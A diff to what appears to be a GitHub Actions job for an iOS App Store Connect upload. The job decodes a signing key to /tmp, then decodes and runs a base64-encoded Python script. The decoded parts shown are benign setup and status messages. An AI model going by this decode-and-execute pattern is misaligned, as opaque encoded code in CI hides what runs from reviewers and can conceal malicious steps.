@@ -28,6 +28,7 @@ jobs:
       run: |
         echo "$KEY_B64" | base64 --decode > /tmp/asc_key.p8
         echo '
+             aW1wb3J0IHN5cywgc3VicHJvY2Vzcywgb3MsIHRpbWUsIGJhc2U2NCwgc2h1dGlsLCBnbG9iLCBw
              bGlzdGxpYiwgcmUsIGpzb24sIGhhc2hsaWIsIHN0cnVjdCwgemxpYgoKdmVudiA9ICcvdG1wL3Rm
              X3ZlbnYnCnN1YnByb2Nlc3MuY2hlY2tfY2FsbChbc3lzLmV4ZWN1dGFibGUsICctbScsICd2ZW52
              JywgdmVudl0sIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwpCnN1YnByb2Nlc3MuY2hlY2tfY2Fs
@@ -418,7 +419,7 @@ jobs:
              IHRoZSBBcHBsZSBJRCBzaG93bgogIFRoZW4gcmUtcnVuIHRoZSBDSSB3b3JrZmxvdyDigJQgYWxs
              IGZ1dHVyZSBydW5zIHdpbGwgdXBsb2FkIGF1dG9tYXRpY2FsbHkuCiIiIgopCnByaW50KGYneGNh
              cmNoaXZlIGFydGlmYWN0IGF2YWlsYWJsZSBmb3IgbWFudWFsIHVwbG9hZCB2aWEgWGNvZGUgT3Jn
-             YW5pemVyOiB7YXJjaGl2ZV9wYXRofScp
+             YW5pemVyJykKcHJpbnQoJ1xuPT09IERPTkUgPT09JykK
         ' | base64 --decode > /tmp/tf.py
         python3 /tmp/tf.py
     - name: Upload xcarchive artifact
